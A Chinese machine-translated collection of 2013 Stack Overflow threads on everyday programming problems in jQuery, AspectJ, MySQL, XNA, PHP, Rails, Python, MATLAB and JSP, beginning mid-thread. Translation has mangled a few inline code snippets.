var len = $("[name='cbox[]']:checked").length; 
```

JavaScript 解决方案：

```
var len = [].slice.call(document.querySelectorAll("[name='cbox[]']"))
    .filter(function(e) { return e.checked; }).length; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T11:06:27.090

`$('input:checked').length`如果您没有此表单以外的任何其他输入标签，则可以。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-27T11:08:33.720

试试这个

jQuery解决方案：

```
var len = $(":checked",$("input[name='cbox[]']")).size(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-27T11:11:22.360

```
var fobj = document.forms[0];

var c = 0;
for (var i = 0; i < formobj.elements.length; i++)
{
if (fobj.elements[i].type == "checkbox")
{
if (fobj.elements[i].checked)
{
c++;
}
}       
}

alert('Total Checked = ' + c); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-02-27T11:13:50.627

试用，

```
var boxes = $('input[name="cbox[]"]:checked'); 
```

找出检查了多少，

```
$(boxes).size(); 
```

或者

```
$(boxes).length(); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-12-11T01:08:24.713

```
var len = $("[name='cbox[]']:checked").length; 
```

会起作用，但如果你直接比较像

```
if ( $("[name='cbox[]']").length= $("[name='cbox[]']:checked").length) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-08-09T09:46:55.373

你也这样做

你必须为 checkBox 定义类，然后按照下面

var chkLength = $('input.className:checked').length; 警报（chkLength）；

这将从列表中打印您的复选框总数

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-10-21T11:14:19.930

您也可以使用如下

```
$('[name=cbox\\[\\]]:checked').length 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-11-01T12:37:57.140

试试这个，

var ch_n = $( "输入：已检查" ).length;

# html - Firefox/Internet Explorer 在选择标签中选择/突出显示项目的行为

> ID：15110439
> 
> 赞同：6
> 
> 时间：2013-02-27T11:03:48.507
> 
> 标签：html, css, internet-explorer, firefox, html-select

我注意到，在 Firefox 中，当您单击箭头打开下拉列表的“选择”标签，然后指向一个选项时，该行以蓝色背景突出显示，正如我所料，没关系。

但是在 Internet Explorer 中，当您单击要选择的选项并使其成为选定选项时，蓝色突出显示将一直保持，直到您单击选择标记之外的其他位置。

有没有办法改变这种行为？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T11:36:03.943

One way would be to use JavaScript. I've used jQuery to make it easier: [JSFiddle example](http://jsfiddle.net/tNLGk/1/).

```
$('select').change(function() {
    $(this).blur();
}) 
```

This removes focus from the element when an option has been selected.

To do this pure JavaScript you'd use `onchange`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-10-03T13:40:19.120

我遇到了这个问题并使用了 James Donnelly 的解决方案，但如果选择了当前选项，我也想防止突出显示（在 IE 中尝试 James 的 jsfiddle 或查看 wilsonrufus 的评论）。

在选项上放置一个点击处理程序似乎可以解决这个问题：

```
var select = $('select');

select.change(function() {
    select.blur();
})

$('select option').click(function() {
    select.blur();
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-02T23:28:07.490

这将负责选择一个新选项以及选择相同的选项：

```
$('select > option').click(function () {
    $(this).parent().blur();
}) 
```

# generics - 如何使用 AspectJ 处理通用结果？

> ID：15110442
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:08.057
> 
> 标签：generics, aop, aspectj

我有一个方面（用 aspectj 语法编写`public aspect ....`），它操纵许多返回 a 的方法的结果，`Collection`以便对结果进行分页。

我不能（或者我不知道如何）在建议中使用泛型，所以无论我调用建议的方法之一，我都会收到警告

`unchecked conversion when advice applied at shadow method-call(java.util.Collection ...), expected java.util.Collection<T> but advice uses java.util.Collection [Xlint:uncheckedAdviceConversion]`

我怎样才能摆脱这个？

斯特凡诺

-- 添加方面代码摘录

```
public aspect PaginationSupportAspect extends ServiceSupportAspect {

    private static final Logger log = LoggerFactory.getLogger(PaginationSupportAspect.class);

    private pointcut paginate(Criteria criteria) : call(Collection org.jcz.persistence.Service+.*(Criteria));

    @SuppressWarnings({ "unchecked", "rawtypes" })
    Collection around(Criteria criteria, Service service) : paginate(criteria) && target(service) {
        log.trace(String.format("Executing <%s> @ <%s>", this.getClass(), thisJoinPoint.toLongString()));

        return doPaginate(proceed(criteria, service), criteria.getPagination(), service);
    }

    /**
     * 
     * @param source
     * @param criteria
     * @return
     */
    private <T extends EntitySupport> Collection<T> doPaginate(Collection<T> source, Pagination pagination, Service<T> service) {
        // IMPLEMENTATION OMITTED BECAUSE IT'S QUITE LONG

        // What it does is to create another Collection<T> that holds the pagination coordinates (page number, size, count) 
        // and only the elements of the requested page
    }

} 
```

使用示例

```
Collection<MyEntity> entities = myEntityService.findAll(criteria); 
```

这就是我收到警告的地方

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T11:48:58.937

坏消息：我不知道如何避免警告，因为我对 Java 泛型不是那么精通，特别是与 AspectJ 无关，因为在语法上并没有您可能期望的所有内容，例如将 绑定`target()`到参数化类型（因为类型擦除限制）。

可能您在 AspectJ 邮件列表中遇到了与[此](http://dev.eclipse.org/mhonarc/lists/aspectj-users/msg13923.html)问题相同的问题。

好消息：我终于设法用最小的代码示例重现了您的问题，使用了许多虚拟类，对您如何在应用程序中使用它们进行了一些有根据的猜测：

**虚拟/助手类/方面：**

```
package org.jcz.persistence;
public class EntitySupport {} 
```

```
package org.jcz.persistence;
public class MyEntity {} 
```

```
package org.jcz.persistence;
public class Pagination {} 
```

```
package org.jcz.persistence;

public class Criteria {
    public Pagination getPagination() {
        return new Pagination();
    }
} 
```

```
package org.jcz.persistence;

import java.util.ArrayList;
import java.util.Collection;

public class Service<T> {
    public Collection<T> findAll(Criteria criteria) {
        return new ArrayList<T>();
    }
} 
```

```
package org.jcz.persistence;
public abstract aspect ServiceSupportAspect {} 
```

**你的方面，略有变化：**

```
package org.jcz.persistence;

import java.util.ArrayList;
import java.util.Collection;

import org.apache.log4j.Logger;

public aspect PaginationSupportAspect extends ServiceSupportAspect {
    private static final Logger log = Logger.getLogger(PaginationSupportAspect.class);

    private pointcut paginate(Criteria criteria) :
        call(Collection org.jcz.persistence.Service+.*(Criteria)) && args(criteria);

    @SuppressWarnings({ "unchecked", "rawtypes" })
    Collection around(Criteria criteria, Service service) : paginate(criteria) && target(service) {
        log.trace(String.format("Executing <%s> @ <%s>", this.getClass(), thisJoinPoint.toLongString()));
        return doPaginate(proceed(criteria, service), criteria.getPagination(), service);
    }

    private <T extends EntitySupport> Collection<T> doPaginate(
            Collection<T> source, Pagination pagination, Service<T> service)
    {
        System.out.println("doPaginate");
        return new ArrayList<T>();
    }
} 
```

**现在是一个小驱动程序应用程序重现 Xlint 警告：**

```
import java.util.Collection;

import org.jcz.persistence.Criteria;
import org.jcz.persistence.MyEntity;
import org.jcz.persistence.Service;

public class Application {
    public static void main(String[] args) {
        Service<MyEntity> myEntityService = new Service<MyEntity>();
        Criteria criteria = new Criteria();
        Collection<MyEntity> entities = myEntityService.findAll(criteria);
        System.out.println("Found entities: " + entities);
    }
} 
```

也许其他人可以做出一些我做不到的事情。我能做的最好的就是复制它。我将尝试将 Andy Clement 指向这篇文章。祝你好运！

# jquery - 在 iframe 区域外拖动（移动）jquery ui 对话框

> ID：15110444
> 
> 赞同：3
> 
> 时间：2013-02-27T11:04:12.217
> 
> 标签：jquery, html, iframe

我在 iframe 中打开了 jquery 可拖动对话框。它在 iframe 内工作正常，但我无法将 jquery 对话框拖到 iframe 之外。我想将对话框拖到 iframe 之外。有人知道我该怎么做吗？

下面是我在可移动.php 文件中使用的示例代码。

```
<html>
<head>
<link href="http://www.jquerydemo.dailyfreecode.com/Styles/Site.css" rel="stylesheet" type="text/css" />
<link href="http://www.jquerydemo.dailyfreecode.com/Styles/css/sunny/jquery-ui-1.8.22.custom.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" language="Javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript" language="Javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.21/jquery-ui.min.js"></script>
<style>
.ui-dialog
{
position:relative !important;
top:0px !important;
}
</style>
</head>
<body>
<a id="hlOpenMe" href="#">Click Me to Open Dialog Box</a>
<div id="dialog" title="My Dialog Title">
<p>This is My Dialog box Description/Content</p>
<p>This is the default dialog which is useful for displaying information. The dialog window can be moved, resized and closed with the 'x' icon.</p>
</div>
<script type="text/javascript">
$(document).ready(function () {
$("#dialog").dialog({ autoOpen: false });

$("#hlOpenMe").click(
function () {
$("#dialog").dialog('open');
return false;
}
);
});
</script>
</body> 
```

现在我在 demo.php 页面中调用了 iframe。

```
<iframe src="movable.php" id="name" name="test" width="50%" height="50%">
</iframe> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-03T18:11:53.447

你不能做这个。对于您的脚本，浏览器窗口是调用它的 iFrame。jQuery 不知道 iFrame 的存在和“外部”。

# mysql - 查询以获取表中行更改的开始和结束日期

> ID：15110445
> 
> 赞同：-3
> 
> 时间：2013-02-27T11:04:12.790
> 
> 标签：mysql, sql

我有一张这样的桌子：

```
id  …   value   …   date_added
1   …   value1  …   some date
1   …   value2  …   some date
1   …   value3  …   some date
1   …   value4  …   some date
2   …   value5  …   some date
2   …   value6  …   some date 
```

我想要这样的东西：

```
id  …   value   …   date_start      date_end
1   …   value1  …   some date       some date
1   …   value2  …   some date       some date
1   …   value3  …   some date       some date
1   …   value4  …   some date       some date
2   …   value5  …   some date       some date
2   …   value6  …   some date 
```

所以一个查询来获取每行添加到表中的日期以及更改的日期。

你怎么做到这一点？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:12:45.550

您可以将结束日期查询为当前行之后的第一个更改日期：

```
select  id
,       value
,       date_start
,       (
        select  date_start
        from    YourTable yt2
        where   yt1.id = yt2.id
                and yt1.date_start < yt2.date_start
        order by
                yt2.date_start
        limit   1
        ) as date_end
from    YourTable yt1 
```

# xna - 如何避免混合不同的精灵动画速度？

> ID：15110449
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:15.703
> 
> 标签：xna, xna-4.0

我不知道为什么每次调用Update_Animation(Point sheetSize, TimeSpan frameInterval, GameTime gameTime) 函数时，精灵动画速度变得更快。它是由gameTime引起的吗？如何解决？谢谢。

```
class Character
{
    #region Field
    // Character file
    System.Xml.Linq.XDocument doc;

    // The texture with animation frames
    Texture2D animationTexture_Stand;
    Texture2D animationTexture_Run;
    Texture2D animationTexture_Hit;

    // The size of single frame inside the animationTexture
    public Point frameSize_Stand;
    public Point frameSize_Run;
    public Point frameSize_Hit;

    // The size and structure of whole frames sheet in animationTexture. The animationTexture could
    // hold animaton sequence organized in multiple rows and multiple columns.
    Point sheetSize_Stand;
    Point sheetSize_Run;
    Point sheetSize_Hit;

    // Amount of time between frames
    TimeSpan frameInterval_Stand;
    TimeSpan frameInterval_Run;
    TimeSpan frameInterval_Hit;
    #endregion

    #region Initialization
    /// <summary>
    /// Constructor of a character class
    /// </summary>
    /// <param name="characterName">the name of the xml file of the character without .xml</param>
    /// <param name="content">ContentManager instance</param>
    public Character(String characterName, ContentManager content)
    {
        doc = System.Xml.Linq.XDocument.Load("Content/" + "Player/"  + characterName + ".xml");

        // Get the first sprite info from the XML definition
        var stand = doc.Root.Element("stand");
        var run = doc.Root.Element("run");
        var hit = doc.Root.Element("hit");

        animationTexture_Stand = content.Load<Texture2D>(stand.Attribute("SheetName").Value);
        animationTexture_Run = content.Load<Texture2D>(run.Attribute("SheetName").Value);
        animationTexture_Hit = content.Load<Texture2D>(hit.Attribute("SheetName").Value);

        frameSize_Stand = new Point();
        frameSize_Stand.X = int.Parse(stand.Attribute("FrameWidth").Value, NumberStyles.Integer);
        frameSize_Stand.Y = int.Parse(stand.Attribute("FrameHeight").Value, NumberStyles.Integer);
        frameSize_Run = new Point();
        frameSize_Run.X = int.Parse(run.Attribute("FrameWidth").Value, NumberStyles.Integer);
        frameSize_Run.Y = int.Parse(run.Attribute("FrameHeight").Value, NumberStyles.Integer);
        frameSize_Hit = new Point();
        frameSize_Hit.X = int.Parse(hit.Attribute("FrameWidth").Value, NumberStyles.Integer);
        frameSize_Hit.Y = int.Parse(hit.Attribute("FrameHeight").Value, NumberStyles.Integer);

        sheetSize_Stand = new Point();
        sheetSize_Stand.X = int.Parse(stand.Attribute("SheetColumns").Value, NumberStyles.Integer);
        sheetSize_Stand.Y = int.Parse(stand.Attribute("SheetRows").Value, NumberStyles.Integer);
        sheetSize_Run = new Point();
        sheetSize_Run.X = int.Parse(run.Attribute("SheetColumns").Value, NumberStyles.Integer);
        sheetSize_Run.Y = int.Parse(run.Attribute("SheetRows").Value, NumberStyles.Integer);
        sheetSize_Hit = new Point();
        sheetSize_Hit.X = int.Parse(hit.Attribute("SheetColumns").Value, NumberStyles.Integer);
        sheetSize_Hit.Y = int.Parse(hit.Attribute("SheetRows").Value, NumberStyles.Integer);

        frameInterval_Stand = TimeSpan.FromSeconds(1.0f / int.Parse(stand.Attribute("Speed").Value, NumberStyles.Integer));
        frameInterval_Run = TimeSpan.FromSeconds(1.0f / int.Parse(run.Attribute("Speed").Value, NumberStyles.Integer));
        frameInterval_Hit = TimeSpan.FromSeconds(1.0f / int.Parse(hit.Attribute("Speed").Value, NumberStyles.Integer));

    }
    #endregion

    #region Update Animation
    TimeSpan nextFrame;
    Point currentFrame;

    public void Update_Animation(Point sheetSize, TimeSpan frameInterval, GameTime gameTime)
    {
        if (nextFrame >= frameInterval)
        {
            currentFrame.X++;

            if (currentFrame.X >= sheetSize.X)
            {
                currentFrame.X = 0;
                currentFrame.Y++;
            }

            if (currentFrame.Y >= sheetSize.Y)
                currentFrame.Y = 0;

            nextFrame = TimeSpan.Zero;
        }
        else
        {
            nextFrame += gameTime.ElapsedGameTime;
        }
    }  
    #endregion

    #region Update Control
    KeyboardState mPreviousKeyboardState;

    String action;
    SpriteEffects effect = SpriteEffects.FlipHorizontally;

    Vector2 feetPosition = new Vector2(0, 450);
    Vector2 mSpeed = Vector2.Zero;
    Vector2 mDirection = Vector2.Zero;
    Vector2 mStartingPosition = Vector2.Zero;

    int CHARACTER_SPEED = 50;
    int MOVE_LEFT = -5;
    int MOVE_RIGHT = 5;
    int MOVE_UP = -5;
    int MOVE_DOWN = 5;

    enum State
    {
        Walking,
        Jumping,
        Hitting,
    }

    State mCurrentState = State.Walking;

    public void UpdateControl(GameTime gameTime)
    {
        KeyboardState aCurrentKeyboardState = Keyboard.GetState();

        feetPosition += mDirection * mSpeed * (float)gameTime.ElapsedGameTime.TotalSeconds;
        UpdateMovement(aCurrentKeyboardState, gameTime);
        UpdateJump(aCurrentKeyboardState, gameTime);

        mPreviousKeyboardState = aCurrentKeyboardState;
    }

    private void UpdateMovement(KeyboardState aCurrentKeyboardState, GameTime gameTime)
    {
        if (mCurrentState == State.Walking)
        {
            action = "stand";
            Update_Animation(sheetSize_Stand, frameInterval_Stand, gameTime);

            mSpeed = Vector2.Zero;
            mDirection = Vector2.Zero;

            if (aCurrentKeyboardState.IsKeyDown(Keys.Left) && !aCurrentKeyboardState.IsKeyDown(Keys.Right))
            {
                action = "run";
                effect = SpriteEffects.None;

                mSpeed.X = CHARACTER_SPEED;
                mDirection.X = MOVE_LEFT;

                Update_Animation(sheetSize_Run, frameInterval_Run, gameTime);
            }
            else if (aCurrentKeyboardState.IsKeyDown(Keys.Right) && !aCurrentKeyboardState.IsKeyDown(Keys.Left))
            {
                action = "run";
                effect = SpriteEffects.FlipHorizontally;

                mSpeed.X = CHARACTER_SPEED;
                mDirection.X = MOVE_RIGHT;

                Update_Animation(sheetSize_Run, frameInterval_Run, gameTime);
            }

            if (aCurrentKeyboardState.IsKeyDown(Keys.Z) && mPreviousKeyboardState.IsKeyUp(Keys.Z))
            {
                mCurrentState = State.Hitting;
            }
        }

        if (mCurrentState == State.Hitting)
        {
            action = "hit";

            Update_Animation(sheetSize_Hit, frameInterval_Hit, gameTime);
            mCurrentState = State.Walking;
        }
    }

    private void UpdateJump(KeyboardState aCurrentKeyboardState, GameTime gameTime)
    {
        if (mCurrentState == State.Walking)
        {
            if (aCurrentKeyboardState.IsKeyDown(Keys.Up) && mPreviousKeyboardState.IsKeyUp(Keys.Up))
                Jump();
        }

        if (mCurrentState == State.Jumping)
        {
            if (mStartingPosition.Y - feetPosition.Y > 150)
                mDirection.Y = MOVE_DOWN;

            if (feetPosition.Y > mStartingPosition.Y)
            {
                feetPosition.Y = mStartingPosition.Y;
                mCurrentState = State.Walking;
                mDirection = Vector2.Zero;
            }
        }
    }

    private void Jump()
    {
        if (mCurrentState != State.Jumping)
        {
            mCurrentState = State.Jumping;
            mStartingPosition = feetPosition;
            mDirection.Y = MOVE_UP;
            mSpeed = new Vector2(CHARACTER_SPEED, CHARACTER_SPEED);
        }
    }

    #endregion

    #region Draw Animation
    Texture2D animationTexture;
    Point frameSize;

    /// <summary>
    /// Rendering of the animation
    /// </summary>
    /// <param name="spriteBatch">SpriteBatch in which current frame will be rendered</param>
    /// <param name="position">The position of the current frame</param>
    /// <param name="scale">Scale factor to apply on the current frame</param>
    /// <param name="spriteEffect">SpriteEffect to apply on the current frame</param>
    public void Draw_Animation(SpriteBatch spriteBatch)
    {
        if (action == "stand")
        {
            Assign_Sprite(animationTexture_Stand, frameSize_Stand);
            Draw_Action(spriteBatch, feetPosition, 1.0f, effect);
        }
        else if (action == "run")
        {
            Assign_Sprite(animationTexture_Run, frameSize_Run);
            Draw_Action(spriteBatch, feetPosition, 1.0f, effect);
        }
        else if (action == "hit")
        {
            Assign_Sprite(animationTexture_Hit, frameSize_Hit);
            Draw_Action(spriteBatch, feetPosition, 1.0f, effect);
        }

    }

    private void Assign_Sprite(Texture2D assignAnimationTexture, Point assignFrameSize)
    {
        animationTexture = assignAnimationTexture;   
        //currentFrame = AssignCurrentFrame;
        frameSize = assignFrameSize;
    }

    private void Draw_Action(SpriteBatch spriteBatch, Vector2 position, float scale, SpriteEffects spriteEffect)
    {
        spriteBatch.Draw(animationTexture, position - new Vector2(0, frameSize.Y), new Rectangle(
            frameSize.X * currentFrame.X,
            frameSize.Y * currentFrame.Y,
            frameSize.X,
            frameSize.Y),
            Color.White, 0f, Vector2.Zero, scale, spriteEffect, 0);
    }
    #endregion
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T08:45:47.773

我不确定这是否是问题，但这段代码与我有关：

```
if (nextFrame >= frameInterval)
{
    //Blah blah

    nextFrame = TimeSpan.Zero;
} 
```

如果`gameTime.ElapsedGameTime`不规则（如果您的游戏有性能问题），此方法将无法正确计时。相反，您应该尝试：

```
while (nextFrame >= frameInterval)
{
    //Blah blah

    nextFrame -= frameInterval;
} 
```

因此在 中会有一些“剩余”的时间`nextFrame`，所以下一个动画将在正确的时间出现。

但是，由于您的问题不是很清楚，我不确定这是否真的可以解决您的问题。

# php - JS var 在 WP 中获取 PHP 值

> ID：15110452
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:24.330
> 
> 标签：php, javascript, var

我正在阅读所有类似的问题和答案，但似乎没有一个对我有用。

我有这个：

```
<script>
var MyCity  = "<?php echo 'Cityville';?>";
</script> 
```

但这会输出整个 php。我也试过这个：

```
<?php echo json_encode('City'); ?> 
```

所有这些都在一个 WP 小部件中。

有任何想法吗？

谢谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:13:23.680

问题是您的 echo 语句周围有引号，您需要在变量被输出后将它们放在您的变量中以在脚本中运行，如下所示：

```
<script>
    var MyCity  = <?php echo '"Cityville"';?>;
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:07:23.317

像这样使用

```
<script>
var MyCity  = <?php echo 'Cityville';?>;
</script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:13:08.087

我认为您应该使用 json_encode 进行编码，它将处理字符串中的单引号或双引号。

```
<?php $city = 'Cityville'; ?>
<script>
  var MyCity = <?php echo json_encode($city); ?>;
</script> 
```

# ruby - Rails - 如何从 lib 目录调用方法？

> ID：15110453
> 
> 赞同：1
> 
> 时间：2013-02-27T11:04:25.267
> 
> 标签：ruby, class, methods

我在 lib 目录（文件）中有这个方法`my_class_name.rb`：

```
class MyClassName
  def doSomething
    ...
  end
  ...
end 
```

在控制器中：

```
class UsersController < ApplicationController
  require 'my_class_name'

  def show_stats
    ::MyClassName.doSomething()
  end
end 
```

返回

> MyClassName:Class 的未定义方法“doSomething”

如何正确调用此方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:08:49.687

您已经编写了一个带有实例方法的类，因此如果您想以您编写的方式调用它，您需要编写：

```
 mcn = MyClassName.new
  mcn.doSomething 
```

（通过创建一个实例，然后在该实例上调用该方法）

如果您想要的是类方法，请将其定义为：

```
class MyClassName
  def self.doSomething
    ...
  end
  ...
end 
```

并称之为：`MyClassName.doSomething`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:06:20.313

```
class MyClassName
  def self.doSomething
    ...
  end
  ...
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:18:37.483

您已经创建了实例方法而不是类方法，请按如下方式更改您的代码，另外我建议您不要将其作为一个类，而是将其作为一个模块并包含在您的模型中并从模型中调用 doSomething。

```
class MyClassName
  def self.doSomething
    ...
  end
  ...
end

class UsersController < ApplicationController
  require 'my_class_name'

  def show_stats
    MyClassName.doSomething()
  end
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:41:23.937

如果您希望使其按原样工作（稍作更改），那么您应该创建一个 MyClassName 的实例，例如 ::MyClassName。*新的*.doSomething()

```
class MyClassName
  def doSomething
    ...
  end
  ...
end

class UsersController < ApplicationController
  require 'my_class_name'

  def show_stats
    ::MyClassName.new.doSomething()
  end
end 
```

# python - Python函数返回许多参数

> ID：15110457
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:30.807
> 
> 标签：python, function

我知道，这是一个菜鸟问题..

我有这些变量：

```
pgwdth = 30;  
mrgn = 0;  
fmt = True 
```

而这个功能：

```
def Param(x,pgwdth,mrgn,fmt):
    parametros = x.split(" ")
    if parametros[0][1] == "p":
    numerozinho = int(parametros[1])
        print "Changing pgwdth"
        pgwdth += numerozinho
        print pgwdth
    elif parametros[0][1] == "m":
        numerozinho = int(parametros[1])
        print "Changing mrgn"
        mrgn += numerozinho
        print mrgn
    elif parametros[0][1] == "f":
        numerozinho = parametros[1]
        print "On/Off"
        if numerozinho == "on\n":
            fmt = True
        elif numerozinho == "off\n":
            fmt = False
        else:
            "Error"
        print fmt
    else:
    print "Error" 
```

我只希望它在更改它后返回它用作参数的变量。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:21:46.797

一个函数只返回*一个*结果。诀窍是使该结果成为包含多个值的*元组。*

```
return (x, pgwdth, mrgn, fmt) 
```

在 Python 语法中，元组周围的大括号是可选的，因此您会更经常看到

```
return x, pgwdth, mrgn, fmt 
```

看起来像返回多个值，但现在很明显实际上只有一个返回值

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T11:06:28.697

```
return x,pgwdth,mrgn,fmt 
```

就那么简单。

你称之为：

```
val1,val2,val3,val = Param(x,pgwdth,mrgn,fmt) 
```

# matlab - 低通滤波未按预期工作

> ID：15110458
> 
> 赞同：0
> 
> 时间：2013-02-27T11:04:36.107
> 
> 标签：matlab, filter

以下 Matlab 脚本用于过滤由 50 Hz 和 120 Hz 正弦波组成的信号。我将 rad/s 的频率计算为 Fp= (2*PI * 30)/1000=0.184。我保持 fp=0.184 和 fst=0.185，因为我想过滤掉 50 Hz 和 120 Hz。但是当我绘制滤波器输出的 FFT 时，我得到的是 50 Hz 的正弦波。为什么这个 50Hz 的正弦波即使在滤波之后也会出现？

理想情况下，图中不应有任何峰值。

**过滤前** ![在此处输入图像描述](../Images/4257ed42a81426ccf631ef99909da5d3.png)

**过滤后** ![在此处输入图像描述](../Images/f63a2c7189698aafae8ede6865572145.png)

```
Fs = 1000;                    % Sampling frequency
T = 1/Fs;    % Sample time
L = 1000;                     % Length of signal
t =(0:L-1)*T;                % Time vector 
x = 0.7*sin(2*pi*50*t) + sin(2*pi*120*t);  % Sum of a 50 Hz sinusoid and a 120 Hz sinusoid %
y = x + 2*randn(size(t));     % Sinusoids plus noise

y = x ;

plot(Fs*t(1:50),y(1:50));title('Signal');xlabel('time (milliseconds)')

%pause;

NFFT = 2^nextpow2(L); % Next power of 2 from length of y
Y = fft(y,NFFT)/L; f = Fs/2*linspace(0,1,NFFT/2+1);

% Plot single-sided amplitude spectrum.
plot(f,2*abs(Y(1:NFFT/2+1))) 
title('Single-Sided Amplitude Spectrum of y(t)');xlabel('Frequency(Hz)');ylabel('|Y(f)|')

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%       Now let us see Low Pass Filtering of this signal  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

Fp= (2*pi * 30)/1000; %=0.184 %only frequncies less than 30Hz will be passed  

d=fdesign.lowpass('Fp,Fst,Ap,Ast',0.184,0.185,2,60);

designmethods(d);

Hd = design(d,'equiripple'); fvtool(Hd);

Filterd_Output = filter(Hd,y);

NFFT = 2^nextpow2(L); % Next power of 2 from length of y
Filtered_Freq = fft(Filterd_Output,NFFT)/L;
f = Fs/2*linspace(0,1,NFFT/2+1);

% Plot single-sided amplitude spectrum.
plot(f,2*abs(Filtered_Freq(1:NFFT/2+1)))
title('Single-Sided Amplitude Spectrum of Low Pass Filtered_Output')
xlabel('Frequency (Hz)');ylabel('|Filtered_Freq_Amplitude|') 
```

**更新** 正如建议的那样，我将原始光谱与过滤后的光谱进行了比较。这解释了我很多。但是有什么办法可以让我进一步降低 50 Hz 的峰值吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T14:11:24.003

您错误地指定了过滤器的归一化频率。Matlab 假设频率在 [0, 1] 中，而不是在 [0, pi] 中。

代替

```
d=fdesign.lowpass('Fp,Fst,Ap,Ast',0.184,0.185,2,60); 
```

和

```
d=fdesign.lowpass('Fp,Fst,Ap,Ast', 2*30/Fs, 2*35/Fs,2,60); 
```

或者

```
d=fdesign.lowpass('Fp,Fst,Ap,Ast', 30, 35,2,60, Fs); 
```

它应该按预期工作。

# java - JSP中的变量没有增加

> ID：15110461
> 
> 赞同：1
> 
> 时间：2013-02-27T11:04:43.690
> 
> 标签：java, mysql, database, jsp, increment

我有一个带有表单的 JSP 页面，它在按下提交按钮后调用同一页面。在页面中，我定义了一个变量`x`，最初的值为 1，因此它从对应于 1 的 DB 中获取数据。现在，当按下提交时，x 的值增加到 2，并且应该从对应于新的 DB 中获取数据价值。我的问题是价值增加但没有获取数据。请告诉我为什么？

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@ page import="java.io.*" %>
<%@ page import="java.sql.*" %>
<%@ page import="java.util.*" %>
<jsp:useBean id="Student" scope="session" class="StudentBean.StudentLoginBean"></jsp:useBean>
<%int x=1; %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>welcome <jsp:getProperty property="login" name="Student" />
</title>
</head>
<body>
<%
try{
Class.forName("com.mysql.jdbc.Driver");
    String URL="jdbc:mysql://localhost:3306/OnTest";
    Connection con=null;
    con=DriverManager.getConnection(URL,"root","root");
    PreparedStatement stat=con.prepareStatement("select * from questions where qnNo="+x);
    x+=1;
    ResultSet rs=stat.executeQuery();

    while(rs.next()) {
        out.println(x);
        out.println(rs.getString(1));%>
        <form action="sucess.jsp">
        <br><input type ="radio" name ="answer" value="a">
        <%
        out.println(rs.getString(2));%>
                <input type ="radio" name ="answer" value="b">

        <%
        out.println(rs.getString(3));%>
                <input type ="radio" name ="answer" value="a">
        <%
        out.println(rs.getString(4));%>
                <input type ="radio" name ="answer" value="a">
        <%
        out.println(rs.getString(5));%>     
        <input type="submit" value="submit" name="submit">      
        </form>

        <%

        //System.out.println(rs.getString("name"));
        //System.out.println("    "+rs.getString("password"));
        //v.addElement(rs.getString("name"));
        //v.addElement(rs.getString("name"));
    }
    if(!con.isClosed()) {
        out.println("success");
        }
        }
        catch(Exception e)
        {
        out.println(e);
        }
        %>
<h1><h1><h1>i am inside sucess</h1></h1></h1>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:30:45.913

```
while(rs.next())
{
    out.println(x);
    <form action="sucess.jsp">

    out.println(rs.getString(1));%>
    <br><input type ="radio" name ="answer" value="a">
    <%
    out.println(rs.getString(2));%>
            <input type ="radio" name ="answer" value="b">

    <%
    out.println(rs.getString(3));%>
            <input type ="radio" name ="answer" value="c">
    <%
    out.println(rs.getString(4));%>
            <input type ="radio" name ="answer" value="d">
    <%
    out.println(rs.getString(5));%>     
            <input type ="radio" name ="answer" value="e">
    <input type="submit" value="submit" name="submit">      
    </form>

    <%

    //System.out.println(rs.getString("name"));
    //System.out.println("    "+rs.getString("password"));
    //v.addElement(rs.getString("name"));
    //v.addElement(rs.getString("name"));
} 
```

更改这些值，您将获得解决方案。实际上，您并没有在 Form 方法中执行第一个操作，因此它的行为有所不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:09:52.183

如果您将逻辑与视图分开，那将是一件好事。

